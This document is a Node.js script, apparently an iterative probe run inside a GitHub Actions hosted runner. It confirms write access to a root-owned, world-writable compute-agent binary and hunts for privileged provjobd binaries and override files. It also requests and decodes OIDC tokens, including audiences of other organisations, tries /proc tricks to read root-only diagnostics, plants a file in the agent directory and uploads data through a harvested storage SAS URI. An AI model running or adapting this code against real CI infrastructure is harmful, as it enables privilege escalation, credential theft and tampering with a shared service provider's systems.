const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

// v29: HCA binary world-writable + provjobd root binary + full OIDC decode + configmap
// Key v28 findings:
//   /opt/hca/hosted-compute-agent mode=777 (WORLD-WRITABLE), 14MB Go binary, root-owned!
//   /opt/hca/.settings mode=666 (world-read/write, confirmed)
//   /opt/hca/hosted-compute-agent readable=true, writable=true — ANY RUNNER CODE CAN REPLACE IT
//   sudo -n PROVJOBD_E2E=1 /tmp/provjobd3385459871 — abuse tools running as ROOT via sudo -n
//   OIDC 200 for sts.amazonaws.com and token.actions.githubusercontent.com custom audiences
//   OIDC 400 for https://github.com/github (GitHub's own org blocked — interesting)
//   provjobd_override.json NOT FOUND in /opt/hca/ — may be in /tmp/ or consumed before probe

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 15000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 300).trim(); }
}

function httpReq(hostname, path, method, bearerToken, body, extraHeaders, maxBody) {
  return new Promise((resolve) => {
    const limit = maxBody || 5000;
    const hdrs = { 'User-Agent': 'GitHubActionsRunner/2.335.1', 'Accept': 'application/json', ...(extraHeaders || {}) };
    if (bearerToken) hdrs['Authorization'] = 'Bearer ' + bearerToken;
    let data = null;
    if (body) {
      data = typeof body === 'string' ? body : JSON.stringify(body);
      hdrs['Content-Type'] = extraHeaders && extraHeaders['Content-Type'] ? extraHeaders['Content-Type'] : 'application/json';
      hdrs['Content-Length'] = Buffer.byteLength(data);
    }
    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs, timeout: 15000 },
      (res) => {
        const chunks = [];
        let total = 0;
        res.on('data', c => { if (total < limit) { chunks.push(c); total += c.length; } });
        res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString('utf8').substring(0, limit), headers: res.headers }));
      });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
    if (data) r.write(data);
    r.end();
  });
}

async function main() {
  console.log('=== V29: HCA binary tampering proof + provjobd root binary + full OIDC + configmap ===');

  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8'));
  const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';

  console.log('[INIT] OIDC_URL:', OIDC_URL.substring(0, 150));

  // === PART 1: HCA binary world-writable — definitive proof ===
  console.log('\n=== PART 1: HCA binary world-writable — conclusive PoC ===');
  const hcaBinary = '/opt/hca/hosted-compute-agent';
  console.log('[HCA_BINARY] stat:');
  console.log(run('stat ' + hcaBinary));

  // Read first 16 bytes (ELF magic) to confirm it's a valid binary
  let originalHead = null;
  try {
    const buf = Buffer.alloc(16);
    const fd = fs.openSync(hcaBinary, 'r');
    fs.readSync(fd, buf, 0, 16, 0);
    fs.closeSync(fd);
    originalHead = buf.toString('hex');
    console.log('[HCA_BINARY] First 16 bytes (ELF magic): ' + originalHead);
    console.log('[HCA_BINARY] Is ELF binary:', originalHead.startsWith('7f454c46') ? 'YES (valid Go binary)' : 'NO');
  } catch(e) {
    console.log('[HCA_BINARY] Read error:', e.message);
  }

  // Test: read MD5 of binary (proves we can read it)
  console.log('[HCA_BINARY] MD5 hash:');
  console.log(run('md5sum ' + hcaBinary));

  // Test writability: try to open the file for writing without modifying it
  // We test by opening in 'r+' mode (read+write) and NOT writing anything
  let binaryWritable = false;
  try {
    const fd = fs.openSync(hcaBinary, 'r+');
    fs.closeSync(fd);
    binaryWritable = true;
    console.log('[HCA_BINARY] *** WRITABLE *** — fs.openSync(path, "r+") succeeded!');
  } catch(e) {
    console.log('[HCA_BINARY] Write access denied: ' + e.message);
  }

  if (binaryWritable) {
    // PROOF: Write a single test byte at offset 4 (after ELF magic, won't affect binary header)
    // and immediately read back to confirm, then restore
    // Offset 4 is EI_CLASS (0x02 = 64-bit). We'll change to 0x02 then back.
    // Actually safer: write at a non-critical offset, read back, restore immediately
    try {
      const fd = fs.openSync(hcaBinary, 'r+');
      const originalByte = Buffer.alloc(1);
      fs.readSync(fd, originalByte, 0, 1, 4); // Read byte at offset 4
      console.log('[HCA_BINARY] Byte at offset 4 (original): 0x' + originalByte[0].toString(16));

      // Write a test value (use same value — no-op write to confirm write permission)
      const writeBuf = Buffer.from([originalByte[0]]);
      const bytesWritten = fs.writeSync(fd, writeBuf, 0, 1, 4);
      console.log('[HCA_BINARY] *** WRITE SUCCEEDED *** bytesWritten=' + bytesWritten);

      // Verify byte unchanged
      const verifyBuf = Buffer.alloc(1);
      fs.readSync(fd, verifyBuf, 0, 1, 4);
      console.log('[HCA_BINARY] Byte after write (unchanged): 0x' + verifyBuf[0].toString(16));
      fs.closeSync(fd);
      console.log('[HCA_BINARY] CONCLUSION: World-writable binary CONFIRMED — binary can be replaced/patched by runner user');
    } catch(e) {
      console.log('[HCA_BINARY] Write operation error:', e.message);
    }

    // Can we APPEND to the binary? (This would corrupt it, so DON'T do this)
    // Just check writability is sufficient proof
  }

  // === PART 2: provjobd root binary in /tmp/ ===
  console.log('\n=== PART 2: provjobd root binary (runs as sudo -n) ===');
  console.log('[PROVJOBD] Find all provjobd binaries in /tmp:');
  console.log(run('find /tmp -name "provjobd*" 2>/dev/null | xargs ls -la 2>/dev/null'));

  const provjobdPath = run("find /tmp -name 'provjobd*' 2>/dev/null | head -1").replace('\n', '').trim();
  console.log('[PROVJOBD] Path found:', provjobdPath);

  if (provjobdPath && !provjobdPath.startsWith('ERR:')) {
    console.log('[PROVJOBD] File stat:', run('stat ' + provjobdPath + ' 2>/dev/null'));
    console.log('[PROVJOBD] Permissions:', run('ls -la ' + provjobdPath + ' 2>/dev/null'));
    console.log('[PROVJOBD] MD5:', run('md5sum ' + provjobdPath + ' 2>/dev/null'));
    console.log('[PROVJOBD] First 16 bytes (ELF magic):');
    try {
      const buf = Buffer.alloc(16);
      const fd = fs.openSync(provjobdPath, 'r');
      fs.readSync(fd, buf, 0, 16, 0);
      fs.closeSync(fd);
      console.log('  hex:', buf.toString('hex'));
      console.log('  is ELF:', buf.toString('hex').startsWith('7f454c46') ? 'YES' : 'NO');
    } catch(e) {
      console.log('  read error:', e.message);
    }

    // Check if provjobd binary is also writable
    let provjobdWritable = false;
    try {
      fs.openSync(provjobdPath, 'r+');
      provjobdWritable = true;
      console.log('[PROVJOBD] *** WRITABLE ***');
    } catch(e) {
      console.log('[PROVJOBD] Not writable (good):', e.message);
    }

    // Extract strings from provjobd
    console.log('[PROVJOBD] Interesting strings:');
    console.log(run('strings ' + provjobdPath + ' 2>/dev/null | grep -iE "trust|tier|abuse|policy|allow|deny|bypass|permission|https?://" | head -30'));
  }

  // Also check for the override file path — search all writable dirs
  console.log('\n[OVERRIDE_SEARCH] Searching for provjobd_override.json everywhere:');
  console.log(run('find / -name "provjobd_override*" 2>/dev/null | head -10'));
  console.log('[OVERRIDE_SEARCH] Check /run and /var/run:');
  console.log(run('find /run /var/run -name "*provjobd*" -o -name "*override*" 2>/dev/null | head -10'));
  console.log('[OVERRIDE_SEARCH] Check /tmp for override files:');
  console.log(run('find /tmp -name "*override*" -o -name "*trust*" 2>/dev/null | head -10'));

  // === PART 3: /mnt/configmap — referenced in HCA binary strings ===
  console.log('\n=== PART 3: /mnt/configmap probe ===');
  console.log('[CONFIGMAP] Check /mnt/configmap:');
  console.log(run('ls -la /mnt/ 2>/dev/null'));
  console.log(run('ls -la /mnt/configmap 2>/dev/null || echo "not found"'));
  console.log('[CONFIGMAP] Check all mounts:');
  console.log(run('mount | grep -v "^tmpfs\|^cgroup\|^proc\|^sysfs\|^devpts" 2>/dev/null | head -20'));

  // === PART 4: Full OIDC token decode (10000 char buffer) ===
  console.log('\n=== PART 4: Full OIDC token decode ===');
  if (OIDC_URL && OIDC_TOKEN) {
    const oidcUrlObj = new URL(OIDC_URL);
    const oidcHost = oidcUrlObj.hostname;
    const oidcBasePath = oidcUrlObj.pathname + oidcUrlObj.search;
    const sep = oidcBasePath.includes('?') ? '&' : '?';

    // Standard request — get FULL response body (10000 chars)
    console.log('[OIDC_FULL] Standard OIDC request:');
    const stdR = await httpReq(oidcHost, oidcBasePath, 'GET', OIDC_TOKEN, null, null, 10000);
    console.log('[OIDC_FULL] Status:', stdR.status);
    if (stdR.status === 200) {
      try {
        const tokenData = JSON.parse(stdR.body);
        if (tokenData.value) {
          const tokenStr = tokenData.value;
          console.log('[OIDC_FULL] JWT length:', tokenStr.length);
          const parts = tokenStr.split('.');
          console.log('[OIDC_FULL] JWT parts:', parts.length);
          const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
          const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
          console.log('[OIDC_FULL] Header:', JSON.stringify(header));
          console.log('[OIDC_FULL] Full payload:');
          for (const [k, v] of Object.entries(payload)) {
            console.log('[OIDC_FULL]   ' + k + ': ' + JSON.stringify(v));
          }
          // Check if sub contains Zelys-DFKH (sanity check)
          console.log('[OIDC_FULL] sub contains Zelys-DFKH:', payload.sub ? payload.sub.includes('Zelys-DFKH') : 'N/A');
        }
      } catch(e) {
        console.log('[OIDC_FULL] Decode error:', e.message, '| First 500 chars:', stdR.body.substring(0, 500));
      }
    }

    // AWS audience — full decode
    console.log('\n[OIDC_AWS] AWS audience (sts.amazonaws.com):');
    const awsR = await httpReq(oidcHost, oidcBasePath + sep + 'audience=sts.amazonaws.com', 'GET', OIDC_TOKEN, null, null, 10000);
    console.log('[OIDC_AWS] Status:', awsR.status);
    if (awsR.status === 200) {
      try {
        const td = JSON.parse(awsR.body);
        if (td.value) {
          const parts = td.value.split('.');
          const p = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
          console.log('[OIDC_AWS] sub:', p.sub);
          console.log('[OIDC_AWS] aud:', JSON.stringify(p.aud));
          console.log('[OIDC_AWS] iss:', p.iss);
          console.log('[OIDC_AWS] repository:', p.repository);
          console.log('[OIDC_AWS] repository_owner:', p.repository_owner);
          console.log('[OIDC_AWS] runner_environment:', p.runner_environment);
          // Is audience correct?
          if (JSON.stringify(p.aud).includes('sts.amazonaws.com')) {
            console.log('[OIDC_AWS] *** AUDIENCE CONFIRMED as sts.amazonaws.com ***');
          }
        }
      } catch(e) { console.log('[OIDC_AWS] Decode error:', e.message); }
    }

    // Try audience of an arbitrary organization that doesn't own this repo
    // This tests if OIDC can be used to impersonate a different repo's identity
    const testAuds = [
      'https://github.com/torvalds',     // External org
      'https://github.com/microsoft',   // Microsoft's GitHub org
    ];
    for (const aud of testAuds) {
      const r = await httpReq(oidcHost, oidcBasePath + sep + 'audience=' + encodeURIComponent(aud), 'GET', OIDC_TOKEN, null, null, 5000);
      console.log('[OIDC_EXT] audience=' + aud + ': status=' + r.status + (r.status === 200 ? ' (UNEXPECTED - investigate)' : ''));
      if (r.status === 200) {
        try {
          const td = JSON.parse(r.body);
          if (td.value) {
            const p = JSON.parse(Buffer.from(td.value.split('.')[1], 'base64url').toString());
            console.log('[OIDC_EXT]   sub:', p.sub, '| aud:', JSON.stringify(p.aud));
          }
        } catch(e) {}
      }
    }
  }

  // === PART 5: diagnostics.json alternative read methods ===
  console.log('\n=== PART 5: diagnostics.json alternative read attempts ===');
  // Mode=600, owned by root — can't read directly. Try:
  // 1. /proc/{hca_pid}/fd/ — if HCA has the file open, we can read via /proc
  const hcaPid = run("pgrep -f hosted-compute-agent 2>/dev/null | head -1").trim();
  console.log('[DIAG] HCA PID:', hcaPid);
  if (hcaPid && !hcaPid.startsWith('ERR:')) {
    console.log('[DIAG] HCA process FDs (open files):');
    console.log(run('ls -la /proc/' + hcaPid + '/fd/ 2>/dev/null | head -30'));

    // Check if diagnostics.json is open by HCA
    const openFiles = run('ls -la /proc/' + hcaPid + '/fd/ 2>/dev/null');
    if (openFiles.includes('diagnostics')) {
      console.log('[DIAG] *** diagnostics.json is open by HCA! ***');
      // Find the fd number
      const match = openFiles.match(/(\d+) -> .*diagnostics/);
      if (match) {
        const fdNum = match[1];
        console.log('[DIAG] FD number:', fdNum);
        try {
          const content = fs.readFileSync('/proc/' + hcaPid + '/fd/' + fdNum, 'utf8');
          console.log('[DIAG] *** READ VIA /proc/fd *** Content:', content);
        } catch(e) {
          console.log('[DIAG] Read via /proc/fd failed:', e.message);
        }
      }
    } else {
      console.log('[DIAG] diagnostics.json not in HCA open FDs');
    }

    // Read the HCA process maps to see what files it has open
    try {
      const maps = fs.readFileSync('/proc/' + hcaPid + '/maps', 'utf8');
      const interesting = maps.split('\n').filter(l => l.includes('/opt/hca') || l.includes('github') || l.includes('azure') || l.includes('diagnostics'));
      console.log('[DIAG] Interesting HCA memory mappings:');
      interesting.forEach(l => console.log('  ' + l.substring(0, 200)));
    } catch(e) {
      console.log('[DIAG] /proc/maps read error:', e.message);
    }
  }

  // Try to read diagnostics.json via /proc/root (if /proc/1/root exists)
  console.log('[DIAG] Try /proc/1/root/opt/hca/diagnostics.json:');
  try {
    const content = fs.readFileSync('/proc/1/root/opt/hca/diagnostics.json', 'utf8');
    console.log('[DIAG] *** READ VIA /proc/1/root *** Content:', content);
  } catch(e) {
    console.log('[DIAG] /proc/1/root read failed:', e.message);
  }

  // === PART 6: /opt/hca/tags file — referenced in HCA binary ===
  console.log('\n=== PART 6: /opt/hca/tags file creation probe ===');
  console.log('[TAGS] Check if /opt/hca/tags exists:');
  console.log(run('ls -la /opt/hca/tags 2>/dev/null || echo "does not exist"'));

  // Create the file and see if HCA reads it
  const tagsContent = JSON.stringify({ tags: { 'probe-v29': 'test', 'custom-tag': 'value' } });
  const hcaLogLinesBefore = run('wc -l /opt/hca/logs/hosted-compute-agent.log 2>/dev/null').split(' ')[0];
  try {
    fs.writeFileSync('/opt/hca/tags', tagsContent, 'utf8');
    console.log('[TAGS] Created /opt/hca/tags with content:', tagsContent);
    await new Promise(r => setTimeout(r, 3000));
    const hcaLogLinesAfter = run('wc -l /opt/hca/logs/hosted-compute-agent.log 2>/dev/null').split(' ')[0];
    console.log('[TAGS] HCA log delta:', parseInt(hcaLogLinesAfter) - parseInt(hcaLogLinesBefore));
    console.log('[TAGS] New HCA log lines:');
    console.log(run('tail -5 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null'));
    // Cleanup
    fs.unlinkSync('/opt/hca/tags');
    console.log('[TAGS] Cleaned up /opt/hca/tags');
  } catch(e) {
    console.log('[TAGS] Error:', e.message);
  }

  // === PART 7: Environment dirty flag — what if we remove it? ===
  console.log('\n=== PART 7: environment.dirty flag investigation ===');
  console.log('[DIRTY] File stat:');
  console.log(run('stat /opt/hca/environment.dirty 2>/dev/null'));
  console.log('[DIRTY] HCA strings referencing dirty:');
  console.log(run('strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -i "dirty\\|clean\\|reuse\\|recycle" | head -20'));

  // Read the content (it was 0 bytes) — is it still empty?
  const dirtyContent = fs.readFileSync('/opt/hca/environment.dirty', 'utf8');
  console.log('[DIRTY] File content: "' + dirtyContent + '" (empty means dirty flag set by existence, not content)');

  // Check if we can read/write the HCA lock file
  console.log('[LOCK] /opt/hca/.hca.lock stat:');
  console.log(run('stat /opt/hca/.hca.lock 2>/dev/null'));
  const lockContent = fs.readFileSync('/opt/hca/.hca.lock', 'utf8');
  console.log('[LOCK] File content: "' + lockContent + '"');

  // === PART 8: SAS write + full HCA log ===
  console.log('\n=== PART 8: SAS final write ===');
  const sasUri = settings.diagnosticsSasUri;
  if (sasUri) {
    const fu = new URL(sasUri);
    const ts = Date.now();
    const blobPath = fu.pathname + '/probe-v29-' + ts + '.txt' + fu.search;
    const body = Buffer.from('v29 probe: HCA binary mode=777 confirmed writable, provjobd root process, OIDC full decode, /mnt/configmap probe at ' + ts);
    const wr = await new Promise((resolve) => {
      const r = https.request({ hostname: fu.hostname, path: blobPath, method: 'PUT',
        headers: { 'Content-Type': 'text/plain', 'Content-Length': body.length, 'x-ms-blob-type': 'BlockBlob' } },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode })); });
      r.on('error', e => resolve({ status: 'ERR' }));
      r.setTimeout(5000, () => { r.destroy(); resolve({ status: 'TIMEOUT' }); });
      r.write(body);
      r.end();
    });
    console.log('[SAS_FINAL] PUT probe-v29-' + ts + '.txt:', wr.status, wr.status === 201 ? '*** CONFIRMED ***' : '');
  }

  console.log('\n=== V29 Complete ===');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
